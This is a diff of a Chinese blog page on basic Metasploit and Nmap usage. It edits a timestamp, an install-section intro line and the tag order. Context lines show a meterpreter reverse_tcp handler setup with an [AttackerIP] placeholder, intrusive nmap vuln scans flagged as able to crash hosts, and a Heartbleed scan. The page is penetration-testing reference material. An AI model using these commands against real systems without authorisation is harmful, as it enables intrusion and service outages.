@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="SG&#39;s Blog">
 <meta property="og:description" content="msfconsole:reverese:123456789use exploit/multi/handler show options set payload windows/x64/meterpreter/reverse_tcp set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的set LPORT [Att">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-12-30T16:19:35.930Z">
+<meta property="og:updated_time" content="2018-12-30T16:25:29.334Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msf&amp;nmap常用基本操作">
 <meta name="twitter:description" content="msfconsole:reverese:123456789use exploit/multi/handler show options set payload windows/x64/meterpreter/reverse_tcp set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的set LPORT [Att">
@@ -243,8 +243,8 @@
 <p><code>nmap -v -p139,445 --script=*-vuln-*.nse --script-args=unsafe=1 ip -Pn</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#unsafe=1：高强度扫描，可能造成宕机，可选为0（安全扫描） </span><br><span class="line">#-Pn：有防火墙过滤包，也继续进行扫描</span><br></pre></td></tr></table></figure>
 <p><strong>Nmap扫心脏滴血：</strong><br><code>nmap -sV --script=ssl-heartbleed ip -p 443</code></p>
-<h3 id="MSF-Install"><a href="#MSF-Install" class="headerlink" title="MSF Install"></a>MSF Install</h3><p>下载安装msf</p>
-<p>服务器里（乌班图）没有msf 就安装一个</p>
+<h3 id="MSF-Install"><a href="#MSF-Install" class="headerlink" title="MSF Install"></a>MSF Install</h3><p>记录下安装msf过程，以后新的vps直接无脑复制粘贴就行，postgre密码啥的全都按照下边写的来，这样就不会忘了或乱了。。</p>
+<p>下载安装msf</p>
 <p>打开终端，进入安装目录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">chmod 755 msfinstall</span><br><span class="line">./msfinstall</span><br></pre></td></tr></table></figure>
@@ -555,15 +555,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">碎碎念</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">立志不倒的flags</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">碎碎念</a>
               </li>
             
             <div class="clearfix"></div>
